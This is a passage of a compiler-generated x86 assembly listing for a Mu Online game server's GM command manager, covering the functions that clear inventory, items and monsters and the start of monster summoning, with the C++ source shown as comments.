  000a6	e8 00 00 00 00	 call	 ?GCItemListSend@@YAXH@Z	; GCItemListSend
  000ab	83 c4 04	 add	 esp, 4

; 4739 : 
; 4740 : 
; 4741 : 	wsprintf(szMsg, "Result-ClearInven(%d)", nCount);

  000ae	8b 85 f4 fe ff
	ff		 mov	 eax, DWORD PTR _nCount$[ebp]
  000b4	50		 push	 eax
  000b5	68 00 00 00 00	 push	 OFFSET ??_C@_0BG@EBKONDEM@Result?9ClearInven?$CI?$CFd?$CJ@
  000ba	8d 8d f8 fe ff
	ff		 lea	 ecx, DWORD PTR _szMsg$[ebp]
  000c0	51		 push	 ecx
  000c1	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__wsprintfA
  000c7	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4742 : 	GCServerMsgStringSend(szMsg, lpObj->m_Index, 1);

  000ca	6a 01		 push	 1
  000cc	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  000cf	8b 08		 mov	 ecx, DWORD PTR [eax]
  000d1	51		 push	 ecx
  000d2	8d 95 f8 fe ff
	ff		 lea	 edx, DWORD PTR _szMsg$[ebp]
  000d8	52		 push	 edx
  000d9	e8 00 00 00 00	 call	 ?GCServerMsgStringSend@@YAXPADHE@Z ; GCServerMsgStringSend
  000de	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4743 : }

  000e1	5f		 pop	 edi
  000e2	5e		 pop	 esi
  000e3	5b		 pop	 ebx
  000e4	8b 4d fc	 mov	 ecx, DWORD PTR __$ArrayPad$[ebp]
  000e7	33 cd		 xor	 ecx, ebp
  000e9	e8 00 00 00 00	 call	 @__security_check_cookie@4
  000ee	8b e5		 mov	 esp, ebp
  000f0	5d		 pop	 ebp
  000f1	c2 04 00	 ret	 4
?_ClearInven@CGMMng@@AAEXPAVOBJECTSTRUCT@@@Z ENDP	; CGMMng::_ClearInven
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Mu Online\Mu-GS-Webzen-MC-10093\GameServer\GMMng.cpp
;	COMDAT ?_ClearItem@CGMMng@@AAEXPAVOBJECTSTRUCT@@H@Z
_TEXT	SEGMENT
_nCount$ = -276						; size = 4
_pMapClass$ = -272					; size = 4
_nMapNumber$ = -268					; size = 4
_szMsg$ = -264						; size = 256
_this$ = -8						; size = 4
__$ArrayPad$ = -4					; size = 4
_lpObj$ = 8						; size = 4
_nDistance$ = 12					; size = 4
?_ClearItem@CGMMng@@AAEXPAVOBJECTSTRUCT@@H@Z PROC	; CGMMng::_ClearItem, COMDAT
; _this$ = ecx

; 4705 : {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	81 ec 54 01 00
	00		 sub	 esp, 340		; 00000154H
  00009	a1 00 00 00 00	 mov	 eax, DWORD PTR ___security_cookie
  0000e	33 c5		 xor	 eax, ebp
  00010	89 45 fc	 mov	 DWORD PTR __$ArrayPad$[ebp], eax
  00013	53		 push	 ebx
  00014	56		 push	 esi
  00015	57		 push	 edi
  00016	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 4706 : 	char szMsg[256];
; 4707 : 	ZeroMemory(szMsg, 256);

  00019	68 00 01 00 00	 push	 256			; 00000100H
  0001e	6a 00		 push	 0
  00020	8d 85 f8 fe ff
	ff		 lea	 eax, DWORD PTR _szMsg$[ebp]
  00026	50		 push	 eax
  00027	e8 00 00 00 00	 call	 _memset
  0002c	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4708 : 
; 4709 : 	ERROR_RETURN(nDistance>0, GCServerMsgStringSend("Result-Invalid Argument", lpObj->m_Index, 1) );

  0002f	83 7d 0c 00	 cmp	 DWORD PTR _nDistance$[ebp], 0
  00033	7f 17		 jg	 SHORT $LN2@ClearItem
  00035	6a 01		 push	 1
  00037	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0003a	8b 08		 mov	 ecx, DWORD PTR [eax]
  0003c	51		 push	 ecx
  0003d	68 00 00 00 00	 push	 OFFSET ??_C@_0BI@DMPMDHFM@Result?9Invalid?5Argument@
  00042	e8 00 00 00 00	 call	 ?GCServerMsgStringSend@@YAXPADHE@Z ; GCServerMsgStringSend
  00047	83 c4 0c	 add	 esp, 12			; 0000000cH
  0004a	eb 72		 jmp	 SHORT $LN1@ClearItem
$LN2@ClearItem:

; 4710 : 	
; 4711 : 	int nMapNumber = lpObj->MapNumber;

  0004c	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0004f	0f b6 88 09 01
	00 00		 movzx	 ecx, BYTE PTR [eax+265]
  00056	89 8d f4 fe ff
	ff		 mov	 DWORD PTR _nMapNumber$[ebp], ecx

; 4712 : 	MapClass* pMapClass = &MapC[nMapNumber];

  0005c	69 85 f4 fe ff
	ff 8c 04 05 00	 imul	 eax, DWORD PTR _nMapNumber$[ebp], 328844
  00066	03 05 00 00 00
	00		 add	 eax, DWORD PTR ?MapC@@3PAVMapClass@@A ; MapC
  0006c	89 85 f0 fe ff
	ff		 mov	 DWORD PTR _pMapClass$[ebp], eax

; 4713 : 
; 4714 : 	int nCount = pMapClass->ClearItem(lpObj, nDistance);

  00072	8b 45 0c	 mov	 eax, DWORD PTR _nDistance$[ebp]
  00075	50		 push	 eax
  00076	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  00079	51		 push	 ecx
  0007a	8b 8d f0 fe ff
	ff		 mov	 ecx, DWORD PTR _pMapClass$[ebp]
  00080	e8 00 00 00 00	 call	 ?ClearItem@MapClass@@QAEHPAVOBJECTSTRUCT@@H@Z ; MapClass::ClearItem
  00085	89 85 ec fe ff
	ff		 mov	 DWORD PTR _nCount$[ebp], eax

; 4715 : 
; 4716 : 	wsprintf(szMsg, "Result-ClearItem(%d)", nCount);

  0008b	8b 85 ec fe ff
	ff		 mov	 eax, DWORD PTR _nCount$[ebp]
  00091	50		 push	 eax
  00092	68 00 00 00 00	 push	 OFFSET ??_C@_0BF@KOFDDOJB@Result?9ClearItem?$CI?$CFd?$CJ@
  00097	8d 8d f8 fe ff
	ff		 lea	 ecx, DWORD PTR _szMsg$[ebp]
  0009d	51		 push	 ecx
  0009e	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__wsprintfA
  000a4	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4717 : 	GCServerMsgStringSend(szMsg, lpObj->m_Index, 1);

  000a7	6a 01		 push	 1
  000a9	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  000ac	8b 08		 mov	 ecx, DWORD PTR [eax]
  000ae	51		 push	 ecx
  000af	8d 95 f8 fe ff
	ff		 lea	 edx, DWORD PTR _szMsg$[ebp]
  000b5	52		 push	 edx
  000b6	e8 00 00 00 00	 call	 ?GCServerMsgStringSend@@YAXPADHE@Z ; GCServerMsgStringSend
  000bb	83 c4 0c	 add	 esp, 12			; 0000000cH
$LN1@ClearItem:

; 4718 : }

  000be	5f		 pop	 edi
  000bf	5e		 pop	 esi
  000c0	5b		 pop	 ebx
  000c1	8b 4d fc	 mov	 ecx, DWORD PTR __$ArrayPad$[ebp]
  000c4	33 cd		 xor	 ecx, ebp
  000c6	e8 00 00 00 00	 call	 @__security_check_cookie@4
  000cb	8b e5		 mov	 esp, ebp
  000cd	5d		 pop	 ebp
  000ce	c2 08 00	 ret	 8
?_ClearItem@CGMMng@@AAEXPAVOBJECTSTRUCT@@H@Z ENDP	; CGMMng::_ClearItem
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Mu Online\Mu-GS-Webzen-MC-10093\GameServer\GMMng.cpp
;	COMDAT ?_ClearMonster@CGMMng@@AAEXPAVOBJECTSTRUCT@@H@Z
_TEXT	SEGMENT
_lpTargetObj$1 = -280					; size = 4
_i$2 = -276						; size = 4
_nCount$ = -272						; size = 4
_nMapNumber$ = -268					; size = 4
_szMsg$ = -264						; size = 256
_this$ = -8						; size = 4
__$ArrayPad$ = -4					; size = 4
_lpObj$ = 8						; size = 4
_nDistance$ = 12					; size = 4
?_ClearMonster@CGMMng@@AAEXPAVOBJECTSTRUCT@@H@Z PROC	; CGMMng::_ClearMonster, COMDAT
; _this$ = ecx

; 4664 : {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	81 ec 58 01 00
	00		 sub	 esp, 344		; 00000158H
  00009	a1 00 00 00 00	 mov	 eax, DWORD PTR ___security_cookie
  0000e	33 c5		 xor	 eax, ebp
  00010	89 45 fc	 mov	 DWORD PTR __$ArrayPad$[ebp], eax
  00013	53		 push	 ebx
  00014	56		 push	 esi
  00015	57		 push	 edi
  00016	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 4665 : 	char szMsg[256];
; 4666 : 	ZeroMemory(szMsg, 256);

  00019	68 00 01 00 00	 push	 256			; 00000100H
  0001e	6a 00		 push	 0
  00020	8d 85 f8 fe ff
	ff		 lea	 eax, DWORD PTR _szMsg$[ebp]
  00026	50		 push	 eax
  00027	e8 00 00 00 00	 call	 _memset
  0002c	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4667 : 
; 4668 : 	ERROR_RETURN(nDistance>0, GCServerMsgStringSend("Result-Invalid Argument", lpObj->m_Index, 1) );

  0002f	83 7d 0c 00	 cmp	 DWORD PTR _nDistance$[ebp], 0
  00033	7f 1a		 jg	 SHORT $LN5@ClearMonst
  00035	6a 01		 push	 1
  00037	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0003a	8b 08		 mov	 ecx, DWORD PTR [eax]
  0003c	51		 push	 ecx
  0003d	68 00 00 00 00	 push	 OFFSET ??_C@_0BI@DMPMDHFM@Result?9Invalid?5Argument@
  00042	e8 00 00 00 00	 call	 ?GCServerMsgStringSend@@YAXPADHE@Z ; GCServerMsgStringSend
  00047	83 c4 0c	 add	 esp, 12			; 0000000cH
  0004a	e9 c3 01 00 00	 jmp	 $LN1@ClearMonst
$LN5@ClearMonst:

; 4669 : 
; 4670 : 	int nMapNumber = lpObj->MapNumber;

  0004f	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00052	0f b6 88 09 01
	00 00		 movzx	 ecx, BYTE PTR [eax+265]
  00059	89 8d f4 fe ff
	ff		 mov	 DWORD PTR _nMapNumber$[ebp], ecx

; 4671 : 	int nCount = 0;

  0005f	c7 85 f0 fe ff
	ff 00 00 00 00	 mov	 DWORD PTR _nCount$[ebp], 0

; 4672 : 	for( int i=0; i<MAX_MONSTER; ++i )

  00069	c7 85 ec fe ff
	ff 00 00 00 00	 mov	 DWORD PTR _i$2[ebp], 0
  00073	eb 0f		 jmp	 SHORT $LN4@ClearMonst
$LN2@ClearMonst:
  00075	8b 85 ec fe ff
	ff		 mov	 eax, DWORD PTR _i$2[ebp]
  0007b	83 c0 01	 add	 eax, 1
  0007e	89 85 ec fe ff
	ff		 mov	 DWORD PTR _i$2[ebp], eax
$LN4@ClearMonst:
  00084	81 bd ec fe ff
	ff a8 16 00 00	 cmp	 DWORD PTR _i$2[ebp], 5800 ; 000016a8H
  0008e	0f 8d 4b 01 00
	00		 jge	 $LN3@ClearMonst

; 4673 : 	{
; 4674 : 		LPOBJECTSTRUCT lpTargetObj = &gObj[i];

  00094	69 85 ec fe ff
	ff a0 1b 00 00	 imul	 eax, DWORD PTR _i$2[ebp], 7072
  0009e	03 05 00 00 00
	00		 add	 eax, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  000a4	89 85 e8 fe ff
	ff		 mov	 DWORD PTR _lpTargetObj$1[ebp], eax

; 4675 : 		if( lpTargetObj->MapNumber==nMapNumber 
; 4676 : 			&& gObj[i].Connected==CSS_GAMEPLAYING && gObj[i].Type==OBJTYPE_MONSTER )

  000aa	8b 85 e8 fe ff
	ff		 mov	 eax, DWORD PTR _lpTargetObj$1[ebp]
  000b0	0f b6 88 09 01
	00 00		 movzx	 ecx, BYTE PTR [eax+265]
  000b7	3b 8d f4 fe ff
	ff		 cmp	 ecx, DWORD PTR _nMapNumber$[ebp]
  000bd	0f 85 17 01 00
	00		 jne	 $LN6@ClearMonst
  000c3	69 85 ec fe ff
	ff a0 1b 00 00	 imul	 eax, DWORD PTR _i$2[ebp], 7072
  000cd	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  000d3	83 7c 01 04 03	 cmp	 DWORD PTR [ecx+eax+4], 3
  000d8	0f 85 fc 00 00
	00		 jne	 $LN6@ClearMonst
  000de	69 85 ec fe ff
	ff a0 1b 00 00	 imul	 eax, DWORD PTR _i$2[ebp], 7072
  000e8	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  000ee	0f b7 54 01 64	 movzx	 edx, WORD PTR [ecx+eax+100]
  000f3	83 fa 02	 cmp	 edx, 2
  000f6	0f 85 de 00 00
	00		 jne	 $LN6@ClearMonst

; 4677 : 		{
; 4678 : 			if ( lpTargetObj->Live && lpTargetObj->m_State == OBJST_PLAYING && gObjCalDistance(lpObj, lpTargetObj) <= nDistance )

  000fc	8b 85 e8 fe ff
	ff		 mov	 eax, DWORD PTR _lpTargetObj$1[ebp]
  00102	0f b6 48 66	 movzx	 ecx, BYTE PTR [eax+102]
  00106	85 c9		 test	 ecx, ecx
  00108	0f 84 cc 00 00
	00		 je	 $LN6@ClearMonst
  0010e	8b 85 e8 fe ff
	ff		 mov	 eax, DWORD PTR _lpTargetObj$1[ebp]
  00114	83 b8 b8 01 00
	00 02		 cmp	 DWORD PTR [eax+440], 2
  0011b	0f 85 b9 00 00
	00		 jne	 $LN6@ClearMonst
  00121	8b 85 e8 fe ff
	ff		 mov	 eax, DWORD PTR _lpTargetObj$1[ebp]
  00127	50		 push	 eax
  00128	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  0012b	51		 push	 ecx
  0012c	e8 00 00 00 00	 call	 ?gObjCalDistance@@YAHPAVOBJECTSTRUCT@@0@Z ; gObjCalDistance
  00131	83 c4 08	 add	 esp, 8
  00134	3b 45 0c	 cmp	 eax, DWORD PTR _nDistance$[ebp]
  00137	0f 8f 9d 00 00
	00		 jg	 $LN6@ClearMonst

; 4679 : 			{
; 4680 : 				if (lpTargetObj->m_bGMSummon == TRUE) {

  0013d	8b 85 e8 fe ff
	ff		 mov	 eax, DWORD PTR _lpTargetObj$1[ebp]
  00143	0f b6 88 5c 1a
	00 00		 movzx	 ecx, BYTE PTR [eax+6748]
  0014a	83 f9 01	 cmp	 ecx, 1
  0014d	75 13		 jne	 SHORT $LN8@ClearMonst

; 4681 : 					gObjDel(lpTargetObj->m_Index);

  0014f	8b 85 e8 fe ff
	ff		 mov	 eax, DWORD PTR _lpTargetObj$1[ebp]
  00155	8b 08		 mov	 ecx, DWORD PTR [eax]
  00157	51		 push	 ecx
  00158	e8 00 00 00 00	 call	 ?gObjDel@@YAFH@Z	; gObjDel
  0015d	83 c4 04	 add	 esp, 4

; 4682 : 				} else {

  00160	eb 69		 jmp	 SHORT $LN9@ClearMonst
$LN8@ClearMonst:

; 4683 : 					lpTargetObj->Live	   = 0;

  00162	8b 85 e8 fe ff
	ff		 mov	 eax, DWORD PTR _lpTargetObj$1[ebp]
  00168	c6 40 66 00	 mov	 BYTE PTR [eax+102], 0

; 4684 : 					lpTargetObj->m_State   = OBJST_DYING;	//   .

  0016c	8b 85 e8 fe ff
	ff		 mov	 eax, DWORD PTR _lpTargetObj$1[ebp]
  00172	c7 80 b8 01 00
	00 04 00 00 00	 mov	 DWORD PTR [eax+440], 4

; 4685 : 					lpTargetObj->RegenTime = GetTickCount();

  0017c	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__GetTickCount@0
  00182	8b 8d e8 fe ff
	ff		 mov	 ecx, DWORD PTR _lpTargetObj$1[ebp]
  00188	89 81 04 02 00
	00		 mov	 DWORD PTR [ecx+516], eax

; 4686 : 					lpTargetObj->DieRegen  = 1;

  0018e	8b 85 e8 fe ff
	ff		 mov	 eax, DWORD PTR _lpTargetObj$1[ebp]
  00194	c6 80 fe 01 00
	00 01		 mov	 BYTE PTR [eax+510], 1

; 4687 : 					lpTargetObj->PathCount = 0;

  0019b	8b 85 e8 fe ff
	ff		 mov	 eax, DWORD PTR _lpTargetObj$1[ebp]
  001a1	c7 80 28 01 00
	00 00 00 00 00	 mov	 DWORD PTR [eax+296], 0

; 4688 : #ifdef ADD_SKILL_WITH_COMBO
; 4689 : 					GCDiePlayerSend(lpTargetObj, lpTargetObj->m_Index, 0, lpObj->m_Index);

  001ab	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  001ae	8b 08		 mov	 ecx, DWORD PTR [eax]
  001b0	51		 push	 ecx
  001b1	6a 00		 push	 0
  001b3	8b 95 e8 fe ff
	ff		 mov	 edx, DWORD PTR _lpTargetObj$1[ebp]
  001b9	8b 02		 mov	 eax, DWORD PTR [edx]
  001bb	50		 push	 eax
  001bc	8b 8d e8 fe ff
	ff		 mov	 ecx, DWORD PTR _lpTargetObj$1[ebp]
  001c2	51		 push	 ecx
  001c3	e8 00 00 00 00	 call	 ?GCDiePlayerSend@@YAXPAVOBJECTSTRUCT@@HEH@Z ; GCDiePlayerSend
  001c8	83 c4 10	 add	 esp, 16			; 00000010H
$LN9@ClearMonst:

; 4690 : #else
; 4691 : 					GCDiePlayerSend(lpTargetObj, lpTargetObj->m_Index);
; 4692 : #endif
; 4693 : 				}
; 4694 : 
; 4695 : 				++nCount;

  001cb	8b 85 f0 fe ff
	ff		 mov	 eax, DWORD PTR _nCount$[ebp]
  001d1	83 c0 01	 add	 eax, 1
  001d4	89 85 f0 fe ff
	ff		 mov	 DWORD PTR _nCount$[ebp], eax
$LN6@ClearMonst:

; 4696 : 			}
; 4697 : 		}
; 4698 : 	}

  001da	e9 96 fe ff ff	 jmp	 $LN2@ClearMonst
$LN3@ClearMonst:

; 4699 : 
; 4700 : 	wsprintf(szMsg, "Result-ClearMonster(%d)", nCount);

  001df	8b 85 f0 fe ff
	ff		 mov	 eax, DWORD PTR _nCount$[ebp]
  001e5	50		 push	 eax
  001e6	68 00 00 00 00	 push	 OFFSET ??_C@_0BI@GPFMCLGD@Result?9ClearMonster?$CI?$CFd?$CJ@
  001eb	8d 8d f8 fe ff
	ff		 lea	 ecx, DWORD PTR _szMsg$[ebp]
  001f1	51		 push	 ecx
  001f2	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__wsprintfA
  001f8	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4701 : 	GCServerMsgStringSend(szMsg, lpObj->m_Index, 1);

  001fb	6a 01		 push	 1
  001fd	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00200	8b 08		 mov	 ecx, DWORD PTR [eax]
  00202	51		 push	 ecx
  00203	8d 95 f8 fe ff
	ff		 lea	 edx, DWORD PTR _szMsg$[ebp]
  00209	52		 push	 edx
  0020a	e8 00 00 00 00	 call	 ?GCServerMsgStringSend@@YAXPADHE@Z ; GCServerMsgStringSend
  0020f	83 c4 0c	 add	 esp, 12			; 0000000cH
$LN1@ClearMonst:

; 4702 : }

  00212	5f		 pop	 edi
  00213	5e		 pop	 esi
  00214	5b		 pop	 ebx
  00215	8b 4d fc	 mov	 ecx, DWORD PTR __$ArrayPad$[ebp]
  00218	33 cd		 xor	 ecx, ebp
  0021a	e8 00 00 00 00	 call	 @__security_check_cookie@4
  0021f	8b e5		 mov	 esp, ebp
  00221	5d		 pop	 ebp
  00222	c2 08 00	 ret	 8
?_ClearMonster@CGMMng@@AAEXPAVOBJECTSTRUCT@@H@Z ENDP	; CGMMng::_ClearMonster
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Mu Online\Mu-GS-Webzen-MC-10093\GameServer\GMMng.cpp
;	COMDAT ?_SummonMonster@CGMMng@@AAEXPAVOBJECTSTRUCT@@PBDH@Z
_TEXT	SEGMENT
_nResult$1 = -288					; size = 4
_cSY$2 = -282						; size = 1
_cSX$3 = -281						; size = 1
_i$4 = -280						; size = 4
_lpMonsterAttr$ = -276					; size = 4
_nClass$ = -272						; size = 4
_byMapAttr$ = -265					; size = 1
_szMsg$ = -264						; size = 256
_this$ = -8						; size = 4
__$ArrayPad$ = -4					; size = 4
_lpObj$ = 8						; size = 4
_lpszName$ = 12						; size = 4
_nCount$ = 16						; size = 4
?_SummonMonster@CGMMng@@AAEXPAVOBJECTSTRUCT@@PBDH@Z PROC ; CGMMng::_SummonMonster, COMDAT
; _this$ = ecx

; 4609 : {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	81 ec 60 01 00
	00		 sub	 esp, 352		; 00000160H
  00009	a1 00 00 00 00	 mov	 eax, DWORD PTR ___security_cookie
  0000e	33 c5		 xor	 eax, ebp
  00010	89 45 fc	 mov	 DWORD PTR __$ArrayPad$[ebp], eax
  00013	53		 push	 ebx
  00014	56		 push	 esi
  00015	57		 push	 edi
  00016	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 4610 : 	char szMsg[256];
; 4611 : 	ZeroMemory(szMsg, 256);

  00019	68 00 01 00 00	 push	 256			; 00000100H
  0001e	6a 00		 push	 0
  00020	8d 85 f8 fe ff
	ff		 lea	 eax, DWORD PTR _szMsg$[ebp]
  00026	50		 push	 eax
  00027	e8 00 00 00 00	 call	 _memset
  0002c	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4612 : 	
; 4613 : 	if (nCount < 1) nCount = 1;

  0002f	83 7d 10 01	 cmp	 DWORD PTR _nCount$[ebp], 1
  00033	7d 07		 jge	 SHORT $LN5@SummonMons
  00035	c7 45 10 01 00
	00 00		 mov	 DWORD PTR _nCount$[ebp], 1
$LN5@SummonMons:

; 4614 : 	ERROR_RETURN(lpszName, GCServerMsgStringSend("Result-Invalid Argument", lpObj->m_Index, 1) );

  0003c	83 7d 0c 00	 cmp	 DWORD PTR _lpszName$[ebp], 0
  00040	75 1a		 jne	 SHORT $LN6@SummonMons
  00042	6a 01		 push	 1
  00044	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00047	8b 08		 mov	 ecx, DWORD PTR [eax]
  00049	51		 push	 ecx
  0004a	68 00 00 00 00	 push	 OFFSET ??_C@_0BI@DMPMDHFM@Result?9Invalid?5Argument@
  0004f	e8 00 00 00 00	 call	 ?GCServerMsgStringSend@@YAXPADHE@Z ; GCServerMsgStringSend
  00054	83 c4 0c	 add	 esp, 12			; 0000000cH
  00057	e9 1c 04 00 00	 jmp	 $LN1@SummonMons
$LN6@SummonMons:

; 4615 : 	ERROR_RETURN(nCount<=20, GCServerMsgStringSend("Result-Too Manay Count", lpObj->m_Index, 1) );

  0005c	83 7d 10 14	 cmp	 DWORD PTR _nCount$[ebp], 20 ; 00000014H
  00060	7e 1a		 jle	 SHORT $LN7@SummonMons
  00062	6a 01		 push	 1
  00064	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00067	8b 08		 mov	 ecx, DWORD PTR [eax]
  00069	51		 push	 ecx
  0006a	68 00 00 00 00	 push	 OFFSET ??_C@_0BH@MMJEPHGM@Result?9Too?5Manay?5Count@
  0006f	e8 00 00 00 00	 call	 ?GCServerMsgStringSend@@YAXPADHE@Z ; GCServerMsgStringSend
  00074	83 c4 0c	 add	 esp, 12			; 0000000cH
  00077	e9 fc 03 00 00	 jmp	 $LN1@SummonMons
$LN7@SummonMons:

; 4616 : 
; 4617 : 	BYTE byMapAttr = MapC[lpObj->MapNumber].GetAttr(lpObj->X, lpObj->Y);

  0007c	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0007f	0f bf 88 06 01
	00 00		 movsx	 ecx, WORD PTR [eax+262]
  00086	51		 push	 ecx
  00087	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  0008a	0f bf 82 04 01
	00 00		 movsx	 eax, WORD PTR [edx+260]
  00091	50		 push	 eax
  00092	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  00095	0f b6 91 09 01
	00 00		 movzx	 edx, BYTE PTR [ecx+265]
  0009c	69 ca 8c 04 05
	00		 imul	 ecx, edx, 328844
  000a2	03 0d 00 00 00
	00		 add	 ecx, DWORD PTR ?MapC@@3PAVMapClass@@A ; MapC
  000a8	e8 00 00 00 00	 call	 ?GetAttr@MapClass@@QAEEHH@Z ; MapClass::GetAttr
  000ad	88 85 f7 fe ff
	ff		 mov	 BYTE PTR _byMapAttr$[ebp], al

; 4618 : 	ERROR_RETURN(!( (byMapAttr&MAP_ATTR_SAFTYZONE)==MAP_ATTR_SAFTYZONE ), GCServerMsgStringSend("Result-Is Safetyzone", lpObj->m_Index, 1) );

  000b3	0f b6 85 f7 fe
	ff ff		 movzx	 eax, BYTE PTR _byMapAttr$[ebp]
  000ba	83 e0 01	 and	 eax, 1
  000bd	74 1a		 je	 SHORT $LN8@SummonMons
  000bf	6a 01		 push	 1
  000c1	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  000c4	8b 08		 mov	 ecx, DWORD PTR [eax]
  000c6	51		 push	 ecx
  000c7	68 00 00 00 00	 push	 OFFSET ??_C@_0BF@KINKJFCO@Result?9Is?5Safetyzone@
  000cc	e8 00 00 00 00	 call	 ?GCServerMsgStringSend@@YAXPADHE@Z ; GCServerMsgStringSend
  000d1	83 c4 0c	 add	 esp, 12			; 0000000cH
  000d4	e9 9f 03 00 00	 jmp	 $LN1@SummonMons
$LN8@SummonMons:

; 4619 : 
; 4620 : 	int nClass = atoi(lpszName);

  000d9	8b 45 0c	 mov	 eax, DWORD PTR _lpszName$[ebp]
  000dc	50		 push	 eax
  000dd	e8 00 00 00 00	 call	 _atoi
  000e2	83 c4 04	 add	 esp, 4
  000e5	89 85 f0 fe ff
	ff		 mov	 DWORD PTR _nClass$[ebp], eax

; 4621 : 	LPMONSTER_ATTRIBUTE lpMonsterAttr = NULL;

  000eb	c7 85 ec fe ff
	ff 00 00 00 00	 mov	 DWORD PTR _lpMonsterAttr$[ebp], 0

; 4622 : 	if (nClass)

  000f5	83 bd f0 fe ff
	ff 00		 cmp	 DWORD PTR _nClass$[ebp], 0
  000fc	74 19		 je	 SHORT $LN9@SummonMons

; 4623 : 		lpMonsterAttr = gMAttr.GetAttr(nClass);

  000fe	8b 85 f0 fe ff
	ff		 mov	 eax, DWORD PTR _nClass$[ebp]
  00104	50		 push	 eax
  00105	b9 00 00 00 00	 mov	 ecx, OFFSET ?gMAttr@@3VCMonsterAttr@@A ; gMAttr
  0010a	e8 00 00 00 00	 call	 ?GetAttr@CMonsterAttr@@QAEPAUMONSTER_ATTRIBUTE@@H@Z ; CMonsterAttr::GetAttr
  0010f	89 85 ec fe ff
	ff		 mov	 DWORD PTR _lpMonsterAttr$[ebp], eax
  00115	eb 14		 jmp	 SHORT $LN10@SummonMons
$LN9@SummonMons:

; 4624 : 	else
; 4625 : 		lpMonsterAttr = gMAttr.GetAttr(const_cast<LPSTR>(lpszName));

  00117	8b 45 0c	 mov	 eax, DWORD PTR _lpszName$[ebp]
  0011a	50		 push	 eax
  0011b	b9 00 00 00 00	 mov	 ecx, OFFSET ?gMAttr@@3VCMonsterAttr@@A ; gMAttr
  00120	e8 00 00 00 00	 call	 ?GetAttr@CMonsterAttr@@QAEPAUMONSTER_ATTRIBUTE@@PAD@Z ; CMonsterAttr::GetAttr
  00125	89 85 ec fe ff
	ff		 mov	 DWORD PTR _lpMonsterAttr$[ebp], eax
$LN10@SummonMons:

; 4626 : 	ERROR_RETURN(lpMonsterAttr, GCServerMsgStringSend("Result-Monster Not Found", lpObj->m_Index, 1) );

  0012b	83 bd ec fe ff
	ff 00		 cmp	 DWORD PTR _lpMonsterAttr$[ebp], 0
  00132	75 1a		 jne	 SHORT $LN11@SummonMons
  00134	6a 01		 push	 1
  00136	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00139	8b 08		 mov	 ecx, DWORD PTR [eax]
  0013b	51		 push	 ecx
  0013c	68 00 00 00 00	 push	 OFFSET ??_C@_0BJ@CEPFBKKD@Result?9Monster?5Not?5Found@
  00141	e8 00 00 00 00	 call	 ?GCServerMsgStringSend@@YAXPADHE@Z ; GCServerMsgStringSend
  00146	83 c4 0c	 add	 esp, 12			; 0000000cH
  00149	e9 2a 03 00 00	 jmp	 $LN1@SummonMons
$LN11@SummonMons:

; 4627 : 	ERROR_RETURN(_GetObjectType(lpMonsterAttr->m_Index)==OBJTYPE_MONSTER, GCServerMsgStringSend("Result-Monster Not Found", lpObj->m_Index, 1) );

  0014e	8b 85 ec fe ff
	ff		 mov	 eax, DWORD PTR _lpMonsterAttr$[ebp]
  00154	0f b7 08	 movzx	 ecx, WORD PTR [eax]
  00157	51		 push	 ecx
  00158	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  0015b	e8 00 00 00 00	 call	 ?_GetObjectType@CGMMng@@AAEHG@Z ; CGMMng::_GetObjectType
  00160	83 f8 02	 cmp	 eax, 2
  00163	74 1a		 je	 SHORT $LN12@SummonMons
  00165	6a 01		 push	 1
  00167	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0016a	8b 08		 mov	 ecx, DWORD PTR [eax]
  0016c	51		 push	 ecx
  0016d	68 00 00 00 00	 push	 OFFSET ??_C@_0BJ@CEPFBKKD@Result?9Monster?5Not?5Found@
  00172	e8 00 00 00 00	 call	 ?GCServerMsgStringSend@@YAXPADHE@Z ; GCServerMsgStringSend
  00177	83 c4 0c	 add	 esp, 12			; 0000000cH
  0017a	e9 f9 02 00 00	 jmp	 $LN1@SummonMons
$LN12@SummonMons:

; 4628 : 
; 4629 : 	for (int i = 0; i < nCount ; ++i) 

